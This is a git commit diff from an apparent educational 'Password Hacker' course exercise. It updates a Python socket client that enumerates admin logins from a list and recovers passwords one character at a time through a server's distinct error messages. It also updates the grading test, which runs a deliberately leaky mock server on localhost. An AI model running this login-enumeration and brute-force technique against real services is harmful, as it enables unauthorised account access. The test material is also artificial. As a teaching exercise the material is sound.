535ce6f43db1cfca1c35a80fc0a0786245bbc2c1
seamus52 <7493527+seamus52@users.noreply.github.com>
2023-09-07 07:47:22 -0700

    stage 4 complete

--- Password Hacker (Python)/task/hacking/hack.py
+++ Password Hacker (Python)/task/hacking/hack.py
@@ -1,65 +1,88 @@
 import sys
 import socket
 import itertools
+import json
 
-from string import ascii_lowercase, digits
+from string import ascii_lowercase, ascii_uppercase, digits
 
 # constant parameters
 MAX_PWD_LEN = 20
 RECV_SIZE = 1024
 PASSWORD_FILE = "passwords.txt"
+ADMIN_FILE = "logins.txt"
 
 
-def read_password_file():
-    with open(PASSWORD_FILE) as f:
+def read_file(file):
+    with open(file) as f:
         for line in f:
             yield line.strip()
 
 
-def brute_force_generator():
-    symbols = ascii_lowercase + digits
-    for i in range(MAX_PWD_LEN):
-        for passwordCandidate in itertools.product(symbols, repeat=i):
-            if len(passwordCandidate) == 0:
-                continue
-
-            yield "".join(passwordCandidate)
+def case_combinations_of(s):
+    case_combinations = list(map("".join, itertools.product(*zip(s.upper(), s.lower()))))
+    for candidate in list(case_combinations):
+        yield candidate
 
 
-def dict_based_generator():
-    for raw_password in read_password_file():
-        mixed_case_combinations_of_pwd = list(map("".join,
-                                                  itertools.product(*zip(raw_password.upper(), raw_password.lower()))))
-        for password_candidate in list(mixed_case_combinations_of_pwd):
-            yield password_candidate
+def login_to_json(username, password=" "):
+    login_dict = {
+                    "login": username,
+                    "password": password
+                 }
+
+    return json.dumps(login_dict)
 
 
-def password_cracker(hostname, port, password_generator):
-    # define socket
+def password_cracker(hostname, port):
+    cracked_login = {}
+
+    # define context manager for socket
     with socket.socket() as s:
         address = (hostname, port)
         s.connect(address)
 
-        while True:
-            password_guess = next(password_generator)
+        # find admin username
+        for admin_username_guess in read_file(ADMIN_FILE):
+            login_msg_json = login_to_json(admin_username_guess)
+            data = login_msg_json.encode()
 
-            # send request
-            data = password_guess.encode()
             s.send(data)
+            response = s.recv(RECV_SIZE).decode()
+            response_dict = json.loads(response)
 
-            # receiving response
-            response = s.recv(RECV_SIZE)
-            response = response.decode()
-
-            if response == "Connection success!":
-                print(password_guess)
+            if response_dict["result"] == "Wrong password!":
+                cracked_login["login"] = admin_username_guess
                 break
 
+        # find password
+        password_candidate = []
+        while True:
+            for c in ascii_lowercase + ascii_uppercase + digits:
+                try:
+                    password_candidate.append(c)
+                    password_guess = "".join(password_candidate)
+                    login_msg_json = login_to_json(admin_username_guess, password_guess)
+
+                    data = login_msg_json.encode()
+                    s.send(data)
+
+                    response = s.recv(RECV_SIZE).decode()
+                    response_dict = json.loads(response)
+
+                    if response_dict["result"] == "Exception happened during login":
+                        break
+                    elif response_dict["result"] == "Connection success!":
+                        cracked_login["password"] = password_guess
+                        print(json.dumps(cracked_login))
+                        return
+
+                    password_candidate.pop()
+                except:
+                    pass
 
 # obtain input
 args = sys.argv
 hostname = args[1]
 port = int(args[2])
 
-# password_cracker(hostname, port, brute_force_generator())
-password_cracker(hostname, port, dict_based_generator())
+password_cracker(hostname, port)
--- Password Hacker (Python)/task/test/tests.py
+++ Password Hacker (Python)/task/test/tests.py
@@ -3,27 +3,37 @@ from hstest.test_case import TestCase
 from hstest.check_result import CheckResult
 from threading import Thread
 from time import sleep
-from itertools import product
 import socket
 import random
+import json
 
 CheckResult.correct = lambda: CheckResult(True, '')
 CheckResult.wrong = lambda feedback: CheckResult(False, feedback)
 
-abc = 'abcdefghijklmnopqrstuvwxyz1234567890'
+abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+
+logins_list = [
+    'admin', 'Admin', 'admin1', 'admin2', 'admin3',
+    'user1', 'user2', 'root', 'default', 'new_user',
+    'some_user', 'new_admin', 'administrator',
+    'Administrator', 'superuser', 'super', 'su', 'alex',
+    'suser', 'rootuser', 'adminadmin', 'useruser',
+    'superadmin', 'username', 'username1'
+]
 
 
-def generate_password():
-    index = 1
-    while True:
-        abc = 'abcdefghijklmnopqrstuvwxyz1234567890'
-        yield from product(abc, repeat=index)
-        index += 1
+def logins():
+    for login in logins_list:
+        yield login
 
 
 def random_password():
-    '''function - generating random password of length from 2 to 3'''
-    return ''.join(random.choice(abc) for i in range(random.randint(2, 3)))
+    '''function - generating random password of length from 6 to 10'''
+    return ''.join(random.choice(abc) for i in range(random.randint(6, 10)))
+
+
+def random_login():
+    return random.choice(list(logins()))
 
 
 class Hacking(StageTest):
@@ -36,6 +46,7 @@ class Hacking(StageTest):
         self.connected = False
         self.message = []
         self.password = None
+        self.login = None
 
     def start_server(self):
         self.serv = Thread(target=lambda: self.server())
@@ -66,14 +77,40 @@ class Hacking(StageTest):
                 data = conn.recv(1024)
                 self.message.append(data.decode('utf8'))
                 if len(self.message) > 1_000_000:
-                    conn.send('Too many attempts to connect!'.encode('utf8'))
+                    conn.send(
+                        json.dumps({
+                            'result': 'Too many attempts to connect!'
+                        }).encode('utf8'))
                     break
                 if not data:
                     break
-                if data.decode('utf8') == self.password:
-                    conn.send('Connection success!'.encode('utf8'))
+
+                try:
+                    login_ = json.loads(data.decode('utf8'))['login']
+                    password_ = json.loads(data.decode('utf8'))['password']
+                except:
+                    conn.send(json.dumps({'result': 'Bad request!'}).encode('utf8'))
+                    continue
+
+                if login_ == self.login:
+                    if self.password == password_:
+                        conn.send(
+                            json.dumps({
+                                'result': 'Connection success!'
+                            }).encode('utf8'))
+                        break
+                    elif self.password.startswith(password_) and password_ != "":
+                        conn.send(
+                            json.dumps({
+                                'result': 'Exception happened during login'
+                            }).encode('utf8'))
+                    else:
+                        conn.send(
+                            json.dumps({
+                                'result': 'Wrong password!'
+                            }).encode('utf8'))
                 else:
-                    conn.send('Wrong password!'.encode('utf8'))
+                    conn.send(json.dumps({'result': 'Wrong login!'}).encode('utf8'))
             conn.close()
         except:
             pass
@@ -81,33 +118,74 @@ class Hacking(StageTest):
     def generate(self):
         self.message = []
         self.password = random_password()
+        self.login = random_login()
         self.start_server()
         return [
-            TestCase(args=['localhost', '9090'],
-                     attach=[self.password], time_limit=25000)
+            TestCase(
+                args=['localhost', '9090'],
+                attach=[self.password, self.login]
+            )
         ]
 
     def check(self, reply, attach):
+        self.stop_server()
 
         if not self.connected:
             return CheckResult.wrong("You didn't connect to the server")
 
-        real_password = attach[0]
-        if reply.split('\n')[0] != real_password:
-            return CheckResult.wrong(f'The password you printed is not correct. The password is "{real_password}"')
-        success = True
-        for i in generate_password():
-            if len(i) == len(real_password):
-                break
-            try:
-                self.message.remove(''.join(i))
-            except ValueError:
-                success = False
-                break
-        if success:
+        real_password, real_login = attach
+        try:
+            json_reply = json.loads(reply)
+        except:
+            return CheckResult.wrong(
+                'The output of your program is not a valid JSON:\n' + reply
+            )
+        try:
+            password = json_reply['password']
+        except KeyError:
+            return CheckResult.wrong(
+                'The output of your program did not contain the field "password":\n' + reply
+            )
+        except TypeError:
+            return CheckResult.wrong(
+                'The output of your program did not contain the field "password":\n' + reply
+            )
+        try:
+            login = json_reply['login']
+        except KeyError:
+            return CheckResult.wrong(
+                'The output of your program did not contain the field "login":\n' + reply
+            )
+        except TypeError:
+            return CheckResult.wrong(
+                'The output of your program did not contain the field "login":\n' + reply
+            )
+        if login != real_login:
+            return CheckResult.wrong('The login you printed is not correct')
+        elif password != real_password:
+            return CheckResult.wrong('The password you printed is not correct')
+        find_first_letter = False
+        for i in self.message:
+            log = json.loads(i)['login']
+            pas = json.loads(i)['password']
+            if find_first_letter is False and len(
+                    pas
+            ) == 1 and log == real_login and real_password.startswith(pas):
+                find_first_letter = True
+            if find_first_letter is True:
+                if log != real_login:
+                    return CheckResult.wrong(
+                        'You should find a correct login and then use only it')
+                if pas[0] != real_password[0]:
+                    return CheckResult.wrong(
+                        'When you find a first letter you should then start your passwords with it'
+                    )
+            if len(pas) > 1:
+                if pas[0:-1] != real_password[0:len(pas[0:-1]) - 1]:
+                    return CheckResult.wrong(
+                        'You have already found the first %d letters of the password. Use them as a beginning'
+                        % len(pas[0:-1]))
             return CheckResult.correct()
-        return CheckResult.wrong(
-            'Your generator algorithm does not include all the variants')
 
 
 if __name__ == '__main__':
